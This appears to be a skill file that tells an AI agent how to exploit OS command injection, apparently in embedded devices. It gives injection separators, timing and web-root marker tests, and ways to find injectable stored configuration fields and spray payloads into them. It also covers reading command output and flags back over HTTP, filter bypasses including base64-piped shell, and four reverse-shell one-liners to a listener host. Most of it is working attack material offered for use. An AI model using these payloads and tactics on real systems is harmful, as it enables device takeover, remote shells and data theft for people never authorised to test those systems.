---
name: command-injection
when: input flows into a shell command (ping, dns lookup, converters, filenames)
tools: [http_request, shell, reverse_shell_listener]
phase: exploit
---
# OS command injection

Separators - try each, incl. when `;` and `&` are filtered but `|` is not:
`; id`, `| id`, `|| id`, `&& id`, `& id`, `$(id)`, `` `id` ``, newline `%0aid`.

CONFIRM which field + encoding actually executes BEFORE building a shell — blind sprays
burn the whole budget on a field that may never run. Two cheap oracles:
- Timing: `; sleep 5` / `| sleep 5` / `$(sleep 5)` — a ~5s slower response means it ran.
- In-band marker (best when you already speak HTTP to the target): write a unique string
  to a path the web server serves, then GET it — needs only redirection, no callback:
  `; echo pwn$$ > <webroot>/m ;` then `GET /m`. If `pwn...` echoes back, that field +
  encoding executes and you now have arbitrary command OUTPUT over plain HTTP.

WHICH field to target — this is where blind runs stall: the OBVIOUS diagnostic fields
(ping, traceroute, network-test, `testip`, `nettest`) are the first thing everyone tries,
so they are the most likely to be input-validated — they reject metacharacters with an
`NG`/error and burn your budget. Do NOT grind them. OS command injection on these devices
far more often hides in a STORED CONFIG field — hostname, DDNS/DNS, NTP/SNTP server, PPPoE
name, timezone — that is written to config and passed to a shell only when the settings are
APPLIED. So pivot from the diagnostic field to the network/system CONFIG-SAVE fields.

Many candidate fields? DON'T probe them one slow `sleep` at a time, and DON'T
reverse-engineer the client JS to find the "right" one. Do this instead:
- Capture ONE legitimate config-save request (submit the real settings form once, or read
  the form) — that hands you EVERY parameter name and the exact save endpoint. You never
  need the JS.
- Replay that save with a DISTINCT marker injected into each field value at once, e.g.
  `field1=...;echo${IFS}m1>/<webroot>/m1;` … `fieldN=...;echo${IFS}mN>/<webroot>/mN;`,
  apply ONCE (one trigger), then GET `/m1`…`/mN`. Whichever marker comes back names the
  executing field — one round-trip, no sleeps, no callback. Then use that field for output.

Get output WITHOUT a reverse shell (most reliable — no egress, no device tooling needed):
redirect into the web root and read it back.
`; id > <webroot>/o ;` then `GET /o`.  Loot a flag the same way:
`; cat /flag* /root/flag* 2>/dev/null > <webroot>/o ;` then `GET /o`.

The payload runs WHEN THE VALUE IS USED, not when it is set: after writing an injected
config value, trigger the consuming action (apply/save the form, enable the feature that
uses it, re-apply the settings, or reboot). No trigger => nothing executes.

Only if you need interactivity AND have confirmed the target can reach you, get a shell
(reverse_shell_listener returns LHOST:LPORT; embedded devices often lack `nc -e`/`bash`,
and egress may be blocked — so this is the fallback, not the first move):
```
; bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
; nc LHOST LPORT -e /bin/sh
; busybox nc LHOST LPORT -e /bin/sh
; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```
Filter bypasses: `${IFS}` for spaces, `c\at`, `/???/??t /f???`, base64 (`echo BASE64|base64 -d|sh`),
`$@`/quotes inside the command name. URL-encode the payload. Confirm with a benign `id`/`whoami` first.
